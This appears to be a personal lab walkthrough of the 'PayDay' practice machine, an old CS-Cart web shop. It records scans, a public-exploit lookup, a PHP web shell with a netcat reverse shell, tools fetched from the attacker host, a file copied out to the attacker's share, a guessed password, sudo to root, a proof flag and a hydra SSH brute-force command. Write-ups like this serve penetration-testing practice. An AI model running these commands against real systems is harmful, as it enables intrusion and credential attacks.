@@ -1,0 +1,120 @@
+																							               PayDay Walkthrough
+																										
+Attacker's Machine: 192.168.45.181
+Victim's Machine: 192.168.155.39
+export IP=192.168.155.39
+	
+nmapAutomator.sh -H $IP -t Full
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
+80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
+|_http-title: CS-Cart. Powerful PHP shopping cart software
+|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
+110/tcp open  pop3        Dovecot pop3d
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
+143/tcp open  imap        Dovecot imapd
+445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
+993/tcp open  ssl/imap    Dovecot imapd
+995/tcp open  ssl/pop3    Dovecot pop3d
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+# Right, let's check out port 80
+
+gobuster dir -u http://$IP:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -b 404 -x html,txt,bak,pdf,config,php,zip
+
+/.html                (Status: 403) [Size: 305]
+/index                (Status: 200) [Size: 28074]
+/index.php            (Status: 200) [Size: 28074]
+/images               (Status: 301) [Size: 335] [--> http://192.168.155.39/images/]
+/image                (Status: 200) [Size: 1971]
+/image.php            (Status: 200) [Size: 1971]
+/catalog              (Status: 301) [Size: 336] [--> http://192.168.155.39/catalog/]
+/admin.php            (Status: 200) [Size: 9483]
+/admin                (Status: 200) [Size: 9483]
+/skins                (Status: 301) [Size: 334] [--> http:/
+
+# We've created a new regular account within the application, but nothing really stands out. Let's check for some public exploits
+
+searchsploit cs-cart     
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                             |  Path
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+CS-Cart - Multiple SQL Injections                                                                                                          | php/webapps/27030.txt
+CS-Cart 1.3.2 - 'index.php' Cross-Site Scripting                                                                                           | php/webapps/31443.txt
+CS-Cart 1.3.3 - 'classes_dir' LFI                                                                                                          | php/webapps/48890.txt
+CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion                                                                                        | php/webapps/1872.txt
+CS-Cart 1.3.3 - 'install.php' Cross-Site Scripting                                                                                         | multiple/webapps/14962.txt
+CS-Cart 1.3.3 - authenticated RCE                                                                                                          | php/webapps/48891.txt
+CS-Cart 1.3.5 - Authentication Bypass                                                                                                      | php/webapps/6352.txt
+CS-Cart 2.0.0 Beta 3 - 'Product_ID' SQL Injection                                                                                          | php/webapps/8184.txt
+CS-Cart 2.0.5 - 'reward_points.post.php' SQL Injection                                                                                     | php/webapps/33146.txt
+CS-Cart 2.2.1 - 'products.php' SQL Injection                                                                                               | php/webapps/36093.txt
+CS-Cart 4.2.4 - Cross-Site Request Forgery                                                                                                 | php/webapps/36358.html
+CS-Cart 4.3.10 - XML External Entity Injection                                                                                             | php/webapps/40770.txt
+
+# The fucking exploits is not very clear, but found something on github
+
+http://192.168.170.39/admin
+
+
+
+https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c
+
+
+
+http://192.168.155.39/skins/shell.phtml
+
+nc -lvnp 4444
+whoami
+www-data
+
+wget http://192.168.45.181:80/linpeas.sh
+
+
+uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),115(lpadmin)
+
+-rw-r--r-- 1 root root 395 Sep 24  2008 /root/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzx6C2kxbb2qPx9eRyW072CYpMhpa2zAlzgdBcElRS49cvTJlDcjqvC8DlpZL9FplzcfpCmD2xisb0VdHUtG2iteYQG5WaxUEeHd4t9XRqA9zCU3QjKq4jIDoT1A54HYLoEBk/jTxjUbaczfoFSgcZEOivBIZEM6usJW4gDgbpok1UoxHfmn7rRs43rgBKxKMpFZyp0+MsDlvKMZUie6F0mY60E2YSlwoyLAJKi0q1/oWB5Kmd3YtP20LIsVqvmbX7zcMXwXgztff0Wxj1dps0x6i1StYx1l14sU84comlceyZjzeYpqMoL+4OtWt4goqTqpiQasnXfv2vhNvCQXQaQ== root@explorer
+
+SUID
+
+-rwsr-xr-- 1 root dhcp 2.9K Sep  7  2007 /lib/dhcp3-client/call-dhclient-script (Unknown SUID binary!) 
+
+# Not really something usefull, we need to get to patrick account, so maybe we've missed something ?
+
+wget http://192.168.45.181:80/pspy32
+
+cp capture.cap \\192.168.45.181\urs\
+
+python -m SimpleHTTPServer 4444
+
+wget http://192.168.155.39:4444/capture.cap
+
+
+
+cat /etc/cron.weekly/sysklogd
+
+# Stuck badly, let's go some some desperate shit, such as trying to login as patrick using the same password such as : patrick / patrick
+   And we got it, fuck this.
+   
+su patrick
+patrick
+
+whoami
+patrick
+
+sudo -l
+User patrick may run the following commands on this host:
+    (ALL) ALL
+
+sudo su
+patrick
+whoami
+root
+cd /root
+cat proof.txt
+d4991865f92ea9eca222b963b34fbcea
+
+hydra -l patrick -e nsr -q ssh://192.168.155.39 -t 4 -w 5 -f
+
